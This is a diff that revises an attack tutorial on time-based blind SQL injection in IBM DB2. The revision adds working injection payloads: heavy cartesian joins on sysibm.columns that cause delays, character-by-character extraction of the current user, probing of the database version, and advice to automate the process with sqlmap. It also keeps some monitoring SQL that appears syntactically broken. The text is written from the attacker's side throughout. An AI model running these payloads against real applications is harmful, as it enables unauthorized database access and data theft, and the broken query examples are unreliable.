@@ -24,26 +24,26 @@ This article describes how to exploit time-based blind SQL injection vulnerabili
 
 ### Understanding Time-based Blind SQL Injection
 
-Time-based blind SQL injection is a method whereby attackers use database response times to infer information. Unlike traditional SQL injection, which might return direct results, this method manipulates SQL queries to induce timed delays based on conditional logic. For example, by injecting a query that delays the response when a condition is true, an attacker can infer whether the condition was met based solely on the time taken to receive a response.
+Time-based blind SQL injection is a method whereby attackers use database response times to infer information. Unlike traditional SQL injection, which might return direct results, this method manipulates SQL queries to induce timed delays based on conditional logic. In IBM DB2, since there is no native SLEEP() or BENCHMARK() function, attackers use resource-intensive ("heavy") queries—such as large cartesian joins—to create a measurable delay when a condition is true.
+
+> **Insight:** Time-based blind SQLi in DB2 relies on triggering slow queries (e.g., joining large system tables multiple times) to cause a noticeable delay when a condition is met. This is especially useful when no direct output is available and boolean-based techniques are unreliable.
 
 The attack sequence typically involves the following steps:
    - Formulate a conditional SQL query.
-   - Use timing functions to introduce delays for specific conditions.
+   - Use a heavy query to introduce a delay for specific conditions.
    - Analyze the response delays to deduce true or false.
 
 ### Conditional Timing in IBM DB2
 
-In the context of IBM DB2, conditional timing uses SQL functions to create processing delays based on query conditions. This method exploits vulnerabilities where user input is not sufficiently validated, allowing attackers to execute timing-based queries.
+In the context of IBM DB2, conditional timing uses heavy SQL queries to create processing delays based on query conditions. This method exploits vulnerabilities where user input is not sufficiently validated, allowing attackers to execute timing-based queries.
 
 Key concepts include:
-   - Conditional delays in queries can reveal data by the timing of responses.
+   - Conditional heavy queries can reveal data by the timing of responses.
    - The lack of input validation allows the execution of time-based conditions.
 
-### Key Functions and Techniques
+### Key Techniques
 
-To implement a time-based blind SQL injection, certain functions and techniques are vital:
-
-- **BENCHMARK()** and **SLEEP()**: These functions are used to artificially introduce delays in SQL execution. By checking the time taken to execute a query, insights about database values can be gleaned.
+To implement a time-based blind SQL injection in DB2, use resource-intensive queries such as cartesian joins of large system tables (e.g., `sysibm.columns`). By checking the time taken to execute a query, insights about database values can be gleaned.
 - **SYSDUMMY1**: A special table in DB2 often utilized to execute test queries.
 - **MON_GET_ACTIVITY** and **MON_GET_CONNECTION**: These functions are employed for monitoring query execution time. Using these functions, one can track and analyze the duration of executed queries, which is pivotal in identifying the impact of injected conditional statements.
 
@@ -53,33 +53,41 @@ To implement a time-based blind SQL injection, certain functions and techniques 
 
 This technique involves crafting SQL queries that exploit timing delays to infer data. 
 
-- Execute the following command to introduce a delay based on a condition:
-  
+- **Verify Vulnerability with a Heavy Query**
   ```sql
-  SELECT CASE WHEN (condition) THEN SLEEP(5) ELSE SLEEP(0) END FROM SYSDUMMY1;
+  ' AND (SELECT COUNT(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 --
   ```
-  
-  This command performs a sleep operation if the condition is true. By observing the time taken for the database response, you can determine whether the condition was true or false.
+  If the application response is delayed, the injection point is likely vulnerable to time-based blind SQLi using heavy queries.
 
-- To monitor execution time and further refine your attack:
+- **Extract Data Character-by-Character**
+  - **Check if the first character of user is 'D' (ASCII 68):**
+    ```sql
+    ' AND (SELECT COUNT(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 AND (SELECT ASCII(SUBSTR(user,1,1)) FROM sysibm.sysdummy1)=68 --
+    ```
+    If the response is delayed, the first character is 'D'. Repeat for each character and position to extract the full value.
 
+- **DB2-Specific: Extract System Metadata (e.g., Version) with Timing**
+  - **Check if DB2 version is 11.x (time-based):**
+    ```sql
+    ' AND (SELECT COUNT(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 AND (SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN 11000000 AND 11999999)>0 --
+    ```
+    If the response is delayed, the version is 11.x. Adjust the range to refine the version.
+
+> **Tip:** You can use similar heavy queries to extract other system information, such as OS version or service pack, by targeting fields in `SYSIBMADM.ENV_SYS_INFO`.
+
+- **Monitor Execution Time**
   ```sql
   SELECT MON_GET_ACTIVITY(NULL, NULL) WHERE EXECUTION_TIME > threshold;
   ```
-  
-  Here, you track the execution time of queries to ensure they match expected delay patterns, which helps validate your inferences about the database content.
+  Track the execution time of queries to ensure they match expected delay patterns, which helps validate your inferences about the database content.
 
-### Monitoring Execution Time
+### Example Output/Behavior
+- **TRUE Condition:** Application response is delayed (e.g., several seconds), indicating the condition is true.
+- **FALSE Condition:** Application response is normal/fast, indicating the condition is false.
 
-Monitoring execution time is a crucial part of exploiting and understanding the potential vulnerabilities in time-based attacks.
-
-- Use the following command to check if execution time exceeds a safe threshold:
-
-  ```sql
-  SELECT MON_GET_CONNECTION(NULL) WHERE QUERY_EXEC_TIME > threshold;
-  ```
-  
-  By setting appropriate thresholds, you can identify timing discrepancies indicative of successful injection attempts.
+### Troubleshooting & Automation
+- If the application response is inconsistent, try increasing the complexity of the heavy query (e.g., more joins) to create a more noticeable delay.
+- Automate the process with tools like sqlmap or custom scripts to iterate through possible values and measure response times.
 
 ## Tools
 
